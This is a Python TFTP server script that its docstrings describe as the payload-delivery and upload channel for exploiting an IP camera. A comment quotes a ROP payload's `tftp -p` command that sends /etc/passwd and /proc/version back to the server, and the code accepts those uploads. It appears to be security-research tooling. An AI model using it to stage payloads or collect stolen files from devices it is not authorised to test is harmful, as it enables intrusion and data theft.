#!/usr/bin/env python3
"""Minimal read-only TFTP server (RFC 1350, octet mode) for payload delivery.

The camera's busybox has `tftp` but no `nc`/`httpd`, so this is the only fetch
channel. Serves one directory, 512-byte blocks, and logs every request.

  tftp_serve.py --dir /tmp/tftp --bind 192.168.4.160

Requests are handled on short-lived worker threads, capped at MAX_TX. A serial
listener wedged on every client that vanished before ACKing: 5 sends x 3 s
timeouts per block, so a burst of 30 dead probes blocked the listener for
minutes and the liveness probe (which deliberately never ACKs) read the server
as dead (measured 2026-11-08: 30 unacked RRQs -> >20 s stall, wedge persisted).
Retries are now 3 x 0.7 s and the listener keeps receiving while they run.
"""
import argparse
import os
import socket
import struct
import sys
import threading

RRQ, DATA, ACK, ERROR = 1, 3, 4, 5
MAX_TX = 32          # concurrent transfers; above this the request is served inline
LOCK = threading.Lock()
LIVE = 0


def _data_sock(a):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    if a.bind != "0.0.0.0":
        sock.bind((a.bind, 0))   # data must come from the address the camera knows
    sock.settimeout(0.7)
    return sock


def serve_rrq(a, srv, peer, name):
    path = os.path.join(a.dir, os.path.basename(name))
    print(f"RRQ {name} from {peer}", flush=True)
    if not os.path.isfile(path):
        srv.sendto(struct.pack(">HH", ERROR, 1) + b"not found\x00", peer)
        return
    with open(path, "rb") as fh:
        blob = fh.read()
    sock = _data_sock(a)
    try:
        block = 1
        off = 0
        while True:
            chunk = blob[off:off + 512]
            pkt = struct.pack(">HH", DATA, block) + chunk
            acked = False
            for _ in range(3):
                sock.sendto(pkt, peer)
                try:
                    ack, _p = sock.recvfrom(1024)
                except socket.timeout:
                    continue
                if len(ack) >= 4 and struct.unpack(">H", ack[:2])[0] == ACK \
                        and struct.unpack(">H", ack[2:4])[0] == block:
                    acked = True
                    break
            if not acked:
                print(f"  block {block} unacked, giving up", flush=True)
                break
            off += 512
            block += 1
            if len(chunk) < 512:
                break
        print(f"  sent {len(blob)}B in {block} blocks", flush=True)
    finally:
        sock.close()


def serve_wrq(a, srv, peer, name):
    """WRQ: the C660 ROP payload exfils /etc/passwd and /proc/version with
    `tftp -p -l <file> <host>` — the old read-only server silently dropped every
    upload, so system() execution on the camera had no observable ground truth."""
    safe = os.path.basename(name).replace("..", "_")
    path = os.path.join(a.dir, safe)
    print(f"WRQ {name} from {peer} -> {path}", flush=True)
    sock = _data_sock(a)
    try:
        sock.sendto(struct.pack(">HH", ACK, 0), peer)   # ACK the WRQ, block 0
        expected = 1
        blob = bytearray()
        while True:
            try:
                d, _ = sock.recvfrom(2048)
            except socket.timeout:
                break
            if len(d) >= 4 and struct.unpack(">H", d[:2])[0] == ERROR:
                msg = d[4:].split(b"\x00")[0].decode(errors="replace")
                print(f"  sender aborted: {msg}", flush=True)
                break
            if len(d) >= 4 and struct.unpack(">H", d[:2])[0] == DATA:
                blk = struct.unpack(">H", d[2:4])[0]
                if blk == expected:
                    blob += d[4:]
                    sock.sendto(struct.pack(">HH", ACK, blk), peer)
                    expected += 1
                    if len(d) < 516:
                        break
                elif blk < expected:
                    sock.sendto(struct.pack(">HH", ACK, blk), peer)  # dup ACK
        if blob:
            with open(path, "wb") as fh:
                fh.write(blob)
            print(f"  received {len(blob)}B -> {path}", flush=True)
    finally:
        sock.close()


def dispatch(a, srv, data, peer):
    name = data[2:].split(b"\x00")[0].decode(errors="replace")
    if data[:2] == bytes([0, 2]):
        serve_wrq(a, srv, peer, name)
    else:
        serve_rrq(a, srv, peer, name)


def _worker(a, srv, data, peer):
    global LIVE
    try:
        dispatch(a, srv, data, peer)
    finally:
        with LOCK:
            LIVE -= 1


def main() -> int:
    global LIVE
    ap = argparse.ArgumentParser()
    ap.add_argument("--dir", default="/tmp/tftp")
    ap.add_argument("--bind", default="0.0.0.0")
    ap.add_argument("--port", type=int, default=69)
    a = ap.parse_args()

    srv = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((a.bind, a.port))
    print(f"tftp on {a.bind}:{a.port} dir={a.dir}", flush=True)

    while True:
        data, peer = srv.recvfrom(2048)
        # opcode 1 = RRQ, 2 = WRQ; everything else (stray DATA/ACK on :69) is noise
        if len(data) < 4 or struct.unpack(">H", data[:2])[0] not in (RRQ, 2):
            continue
        with LOCK:
            busy = LIVE >= MAX_TX
            LIVE += 1
        if busy:
            dispatch(a, srv, data, peer)
            with LOCK:
                LIVE -= 1
        else:
            threading.Thread(target=_worker, args=(a, srv, data, peer), daemon=True).start()
    return 0


if __name__ == "__main__":
    sys.exit(main())
